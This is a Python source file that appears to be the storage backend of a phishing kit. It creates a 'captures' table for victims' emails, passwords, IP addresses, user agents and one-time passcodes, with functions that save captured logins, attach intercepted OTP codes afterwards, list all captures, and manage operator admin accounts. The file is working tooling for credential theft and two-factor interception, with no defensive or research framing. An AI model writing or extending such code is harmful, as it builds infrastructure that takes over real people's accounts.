import os, sqlite3, config

def _pg():
    import psycopg2
    from psycopg2.extras import RealDictCursor
    return psycopg2.connect(config.DATABASE_URL, cursor_factory=RealDictCursor)

class DB:
    def __init__(self): self.is_pg = bool(config.DATABASE_URL)
    def connect(self): return _pg() if self.is_pg else sqlite3.connect(config.DB_PATH)
    def init(self):
        if self.is_pg:
            with self.connect() as c, c.cursor() as cur:
                cur.execute("""CREATE TABLE IF NOT EXISTS captures (
                    id SERIAL PRIMARY KEY, email TEXT, password TEXT, ip TEXT, ua TEXT, ts TEXT, otp TEXT)""")
                cur.execute("CREATE TABLE IF NOT EXISTS admin_users (username TEXT PRIMARY KEY, pw_hash TEXT)")
        else:
            with sqlite3.connect(config.DB_PATH) as c:
                c.execute("""CREATE TABLE IF NOT EXISTS captures (
                    id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, ip TEXT, ua TEXT, ts TEXT, otp TEXT)""")
                c.execute("CREATE TABLE IF NOT EXISTS admin_users (username TEXT PRIMARY KEY, pw_hash TEXT)")
    def insert_capture(self,email,password,ip,ua,ts):
        if self.is_pg:
            with self.connect() as c, c.cursor() as cur:
                cur.execute("INSERT INTO captures (email,password,ip,ua,ts) VALUES (%s,%s,%s,%s,%s) RETURNING id",(email,password,ip,ua,ts))
                return cur.fetchone()["id"]
        with sqlite3.connect(config.DB_PATH) as c:
            cur=c.execute("INSERT INTO captures (email,password,ip,ua,ts) VALUES (?,?,?,?,?)",(email,password,ip,ua,ts))
            return cur.lastrowid
    def set_otp(self,rid,otp):
        if self.is_pg:
            with self.connect() as c, c.cursor() as cur: cur.execute("UPDATE captures SET otp=%s WHERE id=%s",(otp,rid))
        else:
            with sqlite3.connect(config.DB_PATH) as c: c.execute("UPDATE captures SET otp=? WHERE id=?",(otp,rid))
    def all_captures(self):
        if self.is_pg:
            with self.connect() as c, c.cursor() as cur:
                cur.execute("SELECT * FROM captures ORDER BY id DESC"); return cur.fetchall()
        with sqlite3.connect(config.DB_PATH) as c:
            c.row_factory=sqlite3.Row; return c.execute("SELECT * FROM captures ORDER BY id DESC").fetchall()
    def find_admin(self,u):
        if self.is_pg:
            with self.connect() as c, c.cursor() as cur:
                cur.execute("SELECT * FROM admin_users WHERE username=%s",(u,)); return cur.fetchone()
        with sqlite3.connect(config.DB_PATH) as c:
            c.row_factory=sqlite3.Row; return c.execute("SELECT * FROM admin_users WHERE username=?",(u,)).fetchone()
    def set_admin(self,u,h):
        if self.is_pg:
            with self.connect() as c, c.cursor() as cur:
                cur.execute("INSERT INTO admin_users (username,pw_hash) VALUES (%s,%s) ON CONFLICT (username) DO UPDATE SET pw_hash=EXCLUDED.pw_hash",(u,h))
        else:
            with sqlite3.connect(config.DB_PATH) as c: c.execute("INSERT OR REPLACE INTO admin_users (username,pw_hash) VALUES (?,?)",(u,h))

db = DB()
